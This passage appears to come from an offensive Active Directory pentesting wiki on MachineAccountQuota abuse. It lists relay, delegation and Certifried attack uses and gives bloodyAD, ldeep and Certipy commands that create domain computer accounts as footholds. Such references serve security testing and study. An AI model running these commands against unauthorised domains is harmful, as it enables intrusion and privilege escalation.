...
* [Force client authentications](/ad/movement/mitm-and-coerced-authentications), [relay those authentications](/ad/movement/ntlm/relay) to domain controllers using LDAPS, and take advantage of authenticated sessions to create a domain computer account. This account can then be used as a foothold on the AD domain to operate authenticated recon (i.e. [with BloodHound](/ad/recon/tools/bloodhound) for example)
* Create a computer account and use it for [Kerberos RBCD attacks](/ad/movement/kerberos/delegations) when leveraging owned accounts with sufficient permissions (i.e. ACEs like `GenericAll`, `GenericWrite` or `WriteProperty`) against a target machine
* Create a computer account and use it for a [Kerberos Unconstrained Delegation](/ad/movement/kerberos/delegations) attack when leveraging owned accounts with sufficient permissions (i.e. the `SeEnableDelegationPrivilege` user right)
...
[bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) creates the account over LDAP(S).

```bash
bloodyad -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" add computer 'SomeName$' 'SomePassword'
```

[ldeep](https://github.com/franc-pentest/ldeep) (Python):

```bash
ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_HOST" create_computer 'SomeName$' 'SomePassword'
```

[Certipy](https://github.com/ly4k/Certipy) (Python) creates the account over LDAPS and can set its `dNSHostName`/UPN/SPNs in one shot (handy for [Certifried](/ad/movement/ad-cs/certifried)).

```bash
certipy account create -username "$USER@$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_HOST" -user 'SomeName$' -pass 'SomePassword' -dns 'SomeName.$DOMAIN'
```
...
<ResourceCard href="https://blog.netspi.com/machineaccountquota-is-useful-sometimes/" title="blog.netspi.com" description="blog.netspi.com" icon="/assets/favicons/blog.netspi.com.png" />

<ResourceCard href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" title="www.harmj0y.net" description="www.harmj0y.net" icon="/assets/favicons/www.harmj0y.net.png" />

<ResourceCard href="https://social.technet.microsoft.com/wiki/contents/articles/5446.active-directory-how-to-prevent-authenticated-users-from-joining-workstations-to-a-domain.aspx" title="Active Directory: How to Prevent Authenticated Users from Joining Workstations to a Domain" description="social.technet.microsoft.com" icon="/assets/favicons/social.technet.microsoft.com.ico" />
